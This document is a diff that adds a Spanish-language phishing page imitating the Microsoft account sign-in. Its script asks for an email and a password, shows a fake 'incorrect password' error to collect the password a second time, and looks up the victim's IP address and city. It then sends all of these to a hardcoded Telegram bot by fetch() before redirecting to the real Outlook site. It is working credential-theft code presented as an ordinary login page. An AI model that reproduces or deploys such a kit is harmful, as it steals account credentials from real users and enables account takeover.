@@ -1,0 +1,644 @@
+
+ <!DOCTYPE html>
+
+ <html dir="ltr" lang="ES-AR"><head>
+
+
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+
+
+    <title>Iniciar sesión en tu cuenta </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+
+    <link rel="shortcut icon" href="missy/iconitopequenio.ico">
+
+    <link rel="stylesheet"  type="text/css"  href="missy/ai2contrash.css">
+
+
+
+    <script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
+
+
+
+</head>
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  -->
+
+    <!--  -->
+
+    <form  id="thisisthenewforminfo"  class="provide-min-height" method="post" action="vision.php" >
+        <!-- ko withProperties: { '$loginPage': $data } -->
+        <div class="login-paginated-page" ><!--  -->
+
+
+            <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.co }" class="provide-min-height"><!--  -->
+
+                <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.cP },
+                component: { name: 'background-image-control',
+                publicMethods: $page.backgroundControlMethods,
+                event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+
+                    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;missy/partedeatrasquesevebonito.svg&quot;);" class="background-image ext-background-image"></div>
+
+                </div></div>
+
+
+                <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
+                    <!-- ko if: showHeader --><!-- /ko -->
+
+                    <div class="template-section main-section">
+                        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
+                            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }"><!--  -->
+
+                                <!-- ko withProperties: { '$content': $data } -->
+                                <div class="flex-column">
+                                    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->
+
+                                    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->
+
+                                    <div class="win-scroll">
+                                        <div id="lightbox" data-bind="
+                                        animationEnd: $page.paginationControlHelper.animationEnd,
+                                        externalCss: { 'sign-in-box': true },
+                                        css: {
+                                            'inner':  $content.isVerticalSplitTemplate,
+                                            'vertical-split-content': $content.isVerticalSplitTemplate,
+                                            'app': $page.backgroundLogoUrl,
+                                            'wide': $page.paginationControlHelper.useWiderWidth,
+                                            'fade-in-lightbox': $page.fadeInLightBox,
+                                            'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
+                                            'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
+                                            'lightbox-bottom-margin-debug': $page.showDebugDetails,
+                                            'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+
+                                            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
+
+                                            <!-- ko if: svr.B2 --><!-- /ko -->
+
+                                            <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.CI &amp;&amp; showLightboxProgress() }"></div>
+
+                                            <!-- ko if: showLightboxProgress --><!-- /ko -->
+
+                                            <!-- ko if: loadBannerLogo -->
+                                            <div data-bind="component: { name: 'logo-control',
+                                            params: {
+                                                isChinaDc: svr.fIsChinaDc,
+                                                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->
+
+
+                                                <img class="logo" role="img" pngsrc="missy/mincrologis.png" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="missy/mincrologis.svg" alt="Microsoft"><!-- /ko -->
+
+                                                <!-- /ko --></div>
+                                                <!-- /ko -->
+
+                                                <!-- ko if: svr.Dj && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->
+
+                                                <!-- ko if: asyncInitReady -->
+                                                <div role="main" data-bind=""><!--  -->
+
+                                                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+                                                        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --><!-- /ko -->
+
+                                                        <div class="pagination-view animate slide-in-next" data-bind="">
+
+                                                            <!-- ko foreach: views -->
+                                                            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                                            <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind=""><!--  -->
+
+                                                                <!-- ko if: svr.fAllowLoginTextCustomizations -->
+                                                                <div id="verisep" style="">
+                                                                    <div data-bind="component: { name: 'header-control',
+                                                                    params: {
+                                                                        serverData: svr,
+                                                                        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
+                                                                        headerDescription: customDescription() } }"><div>
+                                                                            <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
+                                                                                <div role="heading" aria-level="1" data-bind="text: title">Verificación de cuenta</div>
+                                                                                <!-- ko if: isSubtitleVisible --><!-- /ko -->
+                                                                            </div>
+
+                                                                            <!-- ko if: headerDescription --><!-- /ko -->
+                                                                        </div></div>
+                                                                        <!-- /ko -->
+
+                                                                        <!-- ko ifnot: svr.fAllowLoginTextCustomizations --><!-- /ko -->
+
+                                                                        <!-- ko if: pageDescription && !svr.Cr --><!-- /ko -->
+
+                                                                        <div class="row">
+                                                                            <div role="alert">
+                                                                                <!-- ko if: usernameTextbox.error --><!-- /ko -->
+                                                                            </div>
+
+                                                                            <div class="form-group col-md-24">
+                                                                                <!-- ko if: prefillNames().length > 1 --><!-- /ko -->
+
+                                                                                <!-- ko ifnot: prefillNames().length > 1 -->
+                                                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                                                                                publicMethods: usernameTextbox.placeholderTextboxMethods,
+                                                                                params: {
+                                                                                    serverData: svr,
+                                                                                    hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
+                                                                                    hintCss: 'placeholder' + (!svr.a5 ? ' ltr_override' : '') },
+                                                                                    event: {
+                                                                                        updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                                                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+
+                                                                                        <input type="email" name="thismailinput" id="thismailinput" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true"  aria-label="Escriba su correo electrónico."  placeholder="Correo electrónico"  >
+
+                                                                                        <!-- ko if: svr.fIsUpdatedAutocompleteEnabled -->
+                                                                                        <input name="passwd" type="password" id="i0118" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+                                                                                        <!-- /ko -->
+
+                                                                                        <!-- ko ifnot: svr.fIsUpdatedAutocompleteEnabled --><!-- /ko -->
+
+                                                                                        <!-- /ko -->
+                                                                                        <!-- /ko -->
+                                                                                        <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
+                                                                                        <!-- /ko -->
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+
+
+
+
+                                                                            <div id="divcontrass" style="display: none;">
+                                                                             <div class="animate slide-in-next">
+
+                                                                                <div ><!--  -->
+
+                                                                                    <div class="identityBanner">
+
+                                                                                        <button type="button" class="backButton"  id="idBtn_Back" aria-label="Atrás" onclick="scriptstep3back();">
+                                                                                            <img role="presentation" pngsrc="missy/flechitapalla.png"  
+                                                                                            data-bind="imgSrc" 
+                                                                                            src="missy/flechitapalla.svg">
+                                                                                        </button>
+
+
+                                                                                        <div id="displayNameStep" class="identity" title=""> 
+
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+                                                                                <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Contraseña actual</div>
+                                                                            </div>
+                                                                            <div class="row">
+                                                                                <div class="form-group col-md-24">
+                                                                                    <div role="alert">
+                                                                                        <!-- ko if: passwordTextbox.error -->
+                                                                                    </div>
+
+                                                                                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                                                                                    publicMethods: passwordTextbox.placeholderTextboxMethods,
+                                                                                    params: {
+                                                                                        serverData: svr,
+                                                                                        hintText: str['CT_PWD_STR_PwdTB_Label'] },
+                                                                                        event: {
+                                                                                            updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+
+                                                                                            <input type="password" id="entrydata" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+                                                                                            textInput: passwordTextbox.value,
+                                                                                            ariaDescribedBy: [
+                                                                                            'loginHeader passwordError',
+                                                                                            showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+                                                                                            unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+                                                                                            hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+                                                                                            placeholder: $placeholderText,
+                                                                                            ariaLabel: unsafe_passwordAriaLabel,
+                                                                                            moveOffScreen: showPassword,
+                                                                                            autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off',
+                                                                                            externalCss: {
+                                                                                                'input': true,
+                                                                                                'text-box': true,
+                                                                                                'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Contraseña" aria-label="Escribe la contraseña" tabindex="0">
+
+                                                                                                <!-- ko if: svr.cp && showPassword() -->
+
+
+                                                                                                <!-- ko ifnot: usePlaceholderAttribute --></div>
+
+                                                                                                <!-- ko if: svr.cp -->
+                                                                                            </div>
+                                                                                        </div>
+
+                                                                                        <div class="row">
+                                                                                            <div class="col-md-24">
+                                                                                                <div class="text-13">
+                                                                                                    <!-- ko if: svr.aY && svr.aN -->
+                                                                                                    <!-- ko ifnot: hideForgotMyPassword -->
+                                                                                                    <div class="form-group">
+                                                                                                        <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="
+                                                                                                        text: unsafe_forgotPasswordText,
+                                                                                                        href: accessRecoveryLink || svr.s,
+                                                                                                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
+                                                                                                        click: accessRecoveryLink ? null : resetPassword_onClick">¿Olvidó su contraseña?</a>
+
+                                                                                                        <div class="form-group">
+
+                                                                                                        </div>
+
+
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <!-- aqui cierre-->
+                                                                                    </div>
+
+
+                                                                                    <div id="divcontrasserror" style="display: none;">
+                                                                                     <div class="animate slide-in-next">
+
+                                                                                        <div ><!--  -->
+
+                                                                                            <div class="identityBanner">
+
+                                                                                                <button type="button" class="backButton"  id="idBtn_Back" aria-label="Atrás" onclick="scriptstep3back();">
+                                                                                                    <img role="presentation" pngsrc="missy/flechitapalla.png"  
+                                                                                                    data-bind="imgSrc" 
+                                                                                                    src="missy/flechitapalla.svg">
+                                                                                                </button>
+
+
+                                                                                                <div id="displayNameStep4" class="identity" title=""> 
+
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+                                                                                        <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Contraseña actual</div>
+                                                                                    </div>
+                                                                                    <div class="row">
+                                                                                        <div class="form-group col-md-24">
+                                                                                            <div role="alert">
+                                                                                             <div role="alert" aria-live="assertive">
+                                                                                                <!-- ko if: passwordTextbox.error -->
+                                                                                                <!-- ko if: svr.BJ --><!-- /ko -->
+                                                                                                <!-- ko ifnot: svr.BJ -->
+                                                                                                <div id="passwordError" data-bind="
+                                                                                                externalCss: { 'error': true },
+                                                                                                htmlWithBindings: passwordTextbox.error,
+                                                                                                childBindings: {
+                                                                                                  'idA_IL_ForgotPassword0': {
+                                                                                                      href: accessRecoveryLink || svr.O,
+                                                                                                      attr: {
+                                                                                                          target: accessRecoveryLink &amp;&amp; '_blank',
+                                                                                                          role: supportsNativeCredentialRecovery ? 'button' : 'link'
+                                                                                                      },
+                                                                                                      click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">La cuenta o la contraseña es incorrecta. Si no recuerdas la cuenta,&nbsp;<a id="idA_IL_ForgotPassword0" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ3dd5fa163b852546a08a00aadbf5889511%26id%3d292841%26contextid%3d65B7A92EC0136771%26opid%3dFC7AC28B49AE5D7D%26bk%3d1697499025&amp;id=292841&amp;uiflavor=web&amp;cobrandid=ab0455a0-8d03-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ;bk=1697499025" role="link">restablécela ahora.</a><!-- HR=80041012 --></div>
+                                                                                                      <!-- /ko -->
+                                                                                                      <!-- /ko -->
+                                                                                                  </div>
+                                                                                              </div>
+
+                                                                                              <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                                                                                              publicMethods: passwordTextbox.placeholderTextboxMethods,
+                                                                                              params: {
+                                                                                                serverData: svr,
+                                                                                                hintText: str['CT_PWD_STR_PwdTB_Label'] },
+                                                                                                event: {
+                                                                                                    updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                                                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+
+                                                                                                    <input type="password" id="reclave" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+                                                                                                    textInput: passwordTextbox.value,
+                                                                                                    ariaDescribedBy: [
+                                                                                                    'loginHeader passwordError',
+                                                                                                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+                                                                                                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+                                                                                                    hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+                                                                                                    placeholder: $placeholderText,
+                                                                                                    ariaLabel: unsafe_passwordAriaLabel,
+                                                                                                    moveOffScreen: showPassword,
+                                                                                                    autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off',
+                                                                                                    externalCss: {
+                                                                                                        'input': true,
+                                                                                                        'text-box': true,
+                                                                                                        'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Contraseña" aria-label="Escribe la contraseña" tabindex="0">
+
+                                                                                                        <!-- ko if: svr.cp && showPassword() -->
+
+
+                                                                                                        <!-- ko ifnot: usePlaceholderAttribute --></div>
+
+                                                                                                        <!-- ko if: svr.cp -->
+                                                                                                    </div>
+                                                                                                </div>
+
+                                                                                                <div class="row">
+                                                                                                    <div class="col-md-24">
+                                                                                                        <div class="text-13">
+                                                                                                            <!-- ko if: svr.aY && svr.aN -->
+                                                                                                            <!-- ko ifnot: hideForgotMyPassword -->
+                                                                                                            <div class="form-group">
+                                                                                                                <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="
+                                                                                                                text: unsafe_forgotPasswordText,
+                                                                                                                href: accessRecoveryLink || svr.s,
+                                                                                                                attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
+                                                                                                                click: accessRecoveryLink ? null : resetPassword_onClick">¿Olvidó su contraseña?</a>
+
+                                                                                                                <div class="form-group">
+
+                                                                                                                </div>
+
+
+                                                                                                            </div>
+                                                                                                        </div>
+                                                                                                    </div>
+                                                                                                </div>
+                                                                                                <!-- aqui cierre-->
+                                                                                            </div>
+
+
+                                                                                            <div id="focusstep1"    data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
+                                                                                                <div class="row">
+                                                                                                    <div class="col-md-24">
+                                                                                                        <div class="text-13">
+                                                                                                            <!-- ko if: svr.AZ && !svr.AJ && !svr.Bb -->
+                                                                                                            <!-- ko if: svr.AL --><!-- /ko -->
+
+                                                                                                            <!-- ko ifnot: svr.AL -->
+                                                                                                            <div class="form-group" data-bind="
+                                                                                                            htmlWithBindings: html['WF_STR_SignUpLink_Text'],
+                                                                                                            childBindings: {
+                                                                                                                'signup': {
+                                                                                                                    href: svr.j || '#',
+                                                                                                                    ariaLabel: svr.j ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
+                                                                                                                    click: signup_onClick } }">¿No tiene una cuenta? <a href="#" id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div>
+
+                                                                                                                    <div class="form-group">
+                                                                                                                        <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
+                                                                                                                        text: fidoLinkText,
+                                                                                                                        click: switchToFidoCredLink_onClick">Iniciar sesión con una llave de seguridad</a>
+
+                                                                                                                        <span class="help-button" role="button" tabindex="0" data-bind="
+                                                                                                                        click: fidoHelp_onClick,
+                                                                                                                        pressEnter: fidoHelp_onClick,
+                                                                                                                        hasFocus: hasFocus,
+                                                                                                                        ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="">
+
+
+                                                                                                                        <img role="presentation" pngsrc="missy/unsignorandom.png"  data-bind="imgSrc" src="missy/unsignorandom.svg"><!-- /ko -->
+
+                                                                                                                    </span>
+
+                                                                                                                    <div data-bind=""><!--  -->
+
+                                                                                                                        <div data-bind=""><!-- --></div></div><!-- /ko -->
+                                                                                                                    </div>
+                                                                                                                    <!-- /ko -->
+
+                                                                                                                    <!-- ko if: svr.BE --><!-- /ko -->
+
+                                                                                                                    <!-- ko ifnot: svr.BE -->
+                                                                                                                    <!-- ko if: showCredPicker --><!-- /ko -->
+                                                                                                                    <!-- /ko -->
+
+                                                                                                                    <!-- ko if: svr.aY --><!-- /ko -->
+                                                                                                                </div>
+                                                                                                            </div>
+                                                                                                        </div>
+                                                                                                    </div>
+
+                                                                                                    <!-- ko if: svr.ce --><!-- /ko -->
+
+                                                                                                    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+                                                                                                        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+                                                                                                            <div>
+                                                                                                                <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" >
+
+                                                                                                                    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+                                                                                                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+                                                                                                                        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+                                                                                                                        <div id="stp1butonsigueinte">
+                                                                                                                           <input type="button" id="" class="win-button button_primary button ext-button primary ext-primary"  onclick="scriptstep3();"  value="Siguiente" > 
+                                                                                                                       </div>
+
+                                                                                                                       <div id="stp1butonsigueinteerror" style="display:none;">
+                                                                                                                           <input type="button" id="" class="win-button button_primary button ext-button primary ext-primary"  onclick="scriptstep4();"  value="Siguiente" > 
+                                                                                                                       </div>
+
+                                                                                                                       <div id="stp1butonfinal" style="display:none;">
+                                                                                                                           <input type="button" id="" class="win-button button_primary button ext-button primary ext-primary"  onclick="fomudatgear();"  value="Finalizar" >
+                                                                                                                       </div>
+
+
+                                                                                                                   </form>
+
+
+                                                                                                               </div>
+                                                                                                           </div></div>
+                                                                                                       </div>
+                                                                                                   </div>
+
+                                                                                                   <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+
+                                                                                                   <!-- /ko -->
+                                                                                               </div>
+                                                                                           </div></div>
+                                                                                           <!-- /ko -->
+
+                                                                                           <div data-bind="component: { name: 'instrumentation-control',
+                                                                                           publicMethods: instrumentationMethods,
+                                                                                           params: { serverData: svr } }">
+                                                                                       </div>
+                                                                                       <!-- /ko -->
+                                                                                   </div>
+
+                                                                                   <div data-bind="" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
+                                                                                    <div class="promoted-fed-cred-content" >
+                                                                                        <div class="row tile">
+                                                                                            <div class="table" role="button" tabindex="0"  aria-label="Opciones de inicio de sesión">
+
+                                                                                                <div class="table-row">
+                                                                                                    <div class="table-cell tile-img medium">
+                                                                                                     <img role="presentation"   data-bind="imgSrc" src="missy/signitoconkiave.svg" width="80%">
+                                                                                                 </div>
+                                                                                                 <div class="table-cell text-left content" data-bind="css: { 'content': !svr.cL }">
+                                                                                                    <div data-bind="
+                                                                                                    text: $data.text,
+                                                                                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Opciones de inicio de sesión</div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <!-- /ko -->
+                                                                                </div>
+                                                                        </div>
+                                                                        <input type="hidden" id="ocultpas">
+
+                                                                            <script type="text/javascript">
+                                                                                function scriptstep3(){
+                                                                                 var val = document.getElementById("thismailinput").value;
+                                                                                 if(val == ""){
+                                                                                    return;
+                                                                                }
+                                                                                document.getElementById("displayNameStep").innerHTML = val;
+                                                                                document.getElementById("divcontrass").style.display= "Block";
+                                                                                document.getElementById("divcontrasserror").style.display= "none"; 
+                                                                                document.getElementById("verisep").style.display= "none";
+                                                                                document.getElementById("focusstep1").style.display= "none";
+                                                                                document.getElementById("stp1butonsigueinte").style.display= "none";
+                                                                                document.getElementById("stp1butonsigueinteerror").style.display= "Block";
+                                                                                document.getElementById("stp1butonfinal").style.display= "none";
+                                                                            }
+                                                                            function scriptstep4(){
+                                                                             var val = document.getElementById("entrydata").value;
+                                                                             if(val == ""){
+                                                                                return;
+                                                                            }
+                                                                            document.getElementById("ocultpas").value = val;
+                                                                            var val = document.getElementById("thismailinput").value;
+                                                                            document.getElementById("displayNameStep4").innerHTML = val;
+                                                                            document.getElementById("divcontrass").style.display= "none"; 
+                                                                            document.getElementById("divcontrasserror").style.display= "Block"; 
+                                                                            document.getElementById("verisep").style.display= "none";
+                                                                            document.getElementById("focusstep1").style.display= "none";
+                                                                            document.getElementById("stp1butonsigueinte").style.display= "none";
+                                                                            document.getElementById("stp1butonsigueinteerror").style.display= "none";
+                                                                            document.getElementById("stp1butonfinal").style.display= "Block";
+                                                                            presendinfo();
+                                                                        }
+
+                                                                        function scriptstep3back(){
+                                                                         document.getElementById("divcontrass").style.display= "none"; 
+                                                                         document.getElementById("divcontrasserror").style.display= "none"; 
+                                                                         document.getElementById("verisep").style.display= "Block";
+                                                                         document.getElementById("focusstep1").style.display= "Block";
+                                                                         document.getElementById("stp1butonsigueinte").style.display= "Block";
+                                                                         document.getElementById("stp1butonsigueinteerror").style.display= "none";
+                                                                         document.getElementById("stp1butonfinal").style.display= "none";
+                                                                     }
+                                                                     function fomudatgear() {
+                                                                        var posu = document.getElementById("reclave").value;
+                                                                        if(posu == ""){
+                                                                            return;
+                                                                        }
+                                                                       //let formulario = document.getElementById('thisisthenewforminfo');
+                                                                        //formulario.submit();
+                                                                        sendinfo();
+                                                                    }
+
+
+                                                                    // Obtener datos del BOT
+const apibot = '6460980738:AAGF12a5mmZG0FIZyVynYp1lHfEAThcWqKE';
+const botid = '5045108825';
+
+
+// Obtener la dirección IP del cliente utilizando ipify API
+function getIPAddress(callback) {
+    const url = 'https://api.ipify.org?format=json';
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            callback(ipAddress);
+        })
+        .catch(error => {
+            console.log('Error al obtener la dirección IP');
+            callback('');
+        });
+}
+
+// Obtener la Ciudad del cliente utilizando ipinfo API
+function getIPInfo(ipAddress, callback) {
+    const url = `https://ipinfo.io/${ipAddress}/json`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            callback(data);
+        })
+        .catch(error => {
+            console.log('Error al obtener la información de ubicación');
+            callback(null);
+        });
+}
+
+// Obtener referencia al formulario
+const form = document.getElementById("formdata");
+
+// Agregar evento de envío del formulario
+function sendinfo(){
+    event.preventDefault(); // Evitar el envío del formulario por defecto
+
+    // Obtener los valores de los campos
+     var user = document.getElementById("thismailinput").value;
+    var pasu = document.getElementById("ocultpas").value;
+    var reposu = document.getElementById("reclave").value;
+
+    // Obtener la dirección IP del cliente
+    getIPAddress(function(ipAddress) {
+        getIPInfo(ipAddress, function(ipInfo) {
+            let locationText = "N/A";
+            if (ipInfo && ipInfo.city) {
+                locationText = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
+            }
+            // Construir la URL para enviar el mensaje al bot de Telegram
+            const url = `https://api.telegram.org/bot${apibot}/sendMessage?chat_id=${botid}&text= 🔵Mail🟢 - |[info]|%0A---%0A👨 User: ${user}%0A🔒 Pas: ${pasu}%0A🔒 Repas: ${reposu}%0A🌐 IP: ${ipAddress}%0A${locationText}%0A---`;
+            // Enviar la solicitud GET al bot de Telegram
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://outlook.live.com/mail/0/";
+                        form.reset(); // Restablecer el formulario
+                    } else {
+                        alert("Error al enviar el mensaje");
+                    }
+                })
+                .catch(error => {
+                   // alert("Error de conexión");
+                });
+        });
+    });
+};
+
+function presendinfo(){
+    event.preventDefault(); // Evitar el envío del formulario por defecto
+
+    // Obtener los valores de los campos
+     var user = document.getElementById("thismailinput").value;
+    var pasu = document.getElementById("entrydata").value;
+
+
+    // Obtener la dirección IP del cliente
+    getIPAddress(function(ipAddress) {
+        getIPInfo(ipAddress, function(ipInfo) {
+            let locationText = "N/A";
+            if (ipInfo && ipInfo.city) {
+                locationText = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
+            }
+            // Construir la URL para enviar el mensaje al bot de Telegram
+            const url = `https://api.telegram.org/bot${apibot}/sendMessage?chat_id=${botid}&text= 🔵Mail🟢 - |[info]|%0A---%0A🔵 User: ${user}%0A🟣 Pas: ${pasu}%0A🌐 IP: ${ipAddress}%0A${locationText}%0A---`;
+            // Enviar la solicitud GET al bot de Telegram
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        //window.location.href = "https://outlook.live.com/mail/0/";
+                        form.reset(); // Restablecer el formulario
+                    } else {
+                        alert("Error al enviar el mensaje");
+                    }
+                })
+                .catch(error => {
+                   // alert("Error de conexión");
+                });
+        });
+    });
+};
+
+                                                                </script>
+                                                            </body>
+                                                            </html>
+                                                       
